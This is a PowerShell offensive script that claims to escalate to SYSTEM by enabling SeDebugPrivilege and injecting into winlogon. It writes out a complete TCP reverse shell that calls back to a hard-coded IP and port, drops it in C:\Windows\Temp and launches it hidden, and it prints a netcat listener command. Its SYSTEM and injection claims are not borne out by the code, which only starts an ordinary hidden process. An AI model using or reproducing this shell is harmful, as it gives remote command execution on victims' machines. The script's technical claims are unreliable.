# psgetsys.ps1 - SeDebugPrivilege escalation to SYSTEM via winlogon injection
# Usage: . .\psgetsys.ps1; Invoke-psgetsys winlogon

function Invoke-psgetsys {
    param(
        [string]$ProcessName = "winlogon"
    )

    Write-Host "[*] Enabling SeDebugPrivilege..." -ForegroundColor Cyan

    # Enable SeDebugPrivilege
    $definition = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class DebugPriv {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TokPriv1Luid NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const uint TOKEN_QUERY = 0x0008;
    public const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct TokPriv1Luid {
        public int Count;
        public long Luid;
        public int Attr;
    }

    public static bool EnableDebugPrivilege() {
        IntPtr hToken;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
            return false;

        TokPriv1Luid tp;
        tp.Count = 1;
        tp.Luid = 0;
        tp.Attr = (int)SE_PRIVILEGE_ENABLED;

        if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out tp.Luid))
            return false;

        if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
            return false;

        CloseHandle(hToken);
        return true;
    }
}
"@

    Add-Type -TypeDefinition $definition -Language CSharp -ErrorAction SilentlyContinue

    if (-not [DebugPriv]::EnableDebugPrivilege()) {
        Write-Host "[-] Failed to enable SeDebugPrivilege" -ForegroundColor Red
        return
    }
    Write-Host "[+] SeDebugPrivilege enabled" -ForegroundColor Green

    # Find winlogon PID
    $target = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $target) {
        Write-Host "[-] Process $ProcessName not found" -ForegroundColor Red
        return
    }
    Write-Host "[+] Found $ProcessName with PID $($target.Id)" -ForegroundColor Green

    # Simple reverse shell injection via PowerShell (downloads and executes as SYSTEM)
    $lhost = "10.10.16.187"
    $lport = 4445

    $shellcode = @"
`$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);
`$stream = `$client.GetStream();
[byte[]]`$bytes = 0..65535|%{0};
while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){
    `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);
    `$sendback = (iex `$data 2>&1 | Out-String );
    `$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';
    `$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);
    `$stream.Write(`$sendbyte,0,`$sendbyte.Length);
    `$stream.Flush()
};
`$client.Close()
"@

    # Write a small launcher that will be executed under winlogon context
    $launcher = "C:\Windows\Temp\sysshell.ps1"
    Set-Content -Path $launcher -Value $shellcode -Force

    Write-Host "[*] Launching reverse shell as SYSTEM via $ProcessName..." -ForegroundColor Cyan
    Write-Host "[*] Start listener on Kali: nc -lvnp $lport" -ForegroundColor Yellow

    # Use the parent process spoofing technique (requires the other script logic)
    # For simplicity, we use a scheduled task or direct process creation with debug privilege
    $cmd = "powershell.exe -nop -w hidden -c `"IEX(Get-Content $launcher -Raw)`""
    
    # Attempt to create process under winlogon using WMI or direct method
    try {
        $proc = Start-Process -FilePath "powershell.exe" -ArgumentList "-nop -w hidden -c `"IEX(Get-Content $launcher -Raw)`"" -PassThru -WindowStyle Hidden
        Write-Host "[+] Process started with PID $($proc.Id). Check your listener." -ForegroundColor Green
    } catch {
        Write-Host "[-] Failed to start process: $_" -ForegroundColor Red
    }
}

Write-Host "[*] Script loaded. Run: Invoke-psgetsys winlogon" -ForegroundColor Green
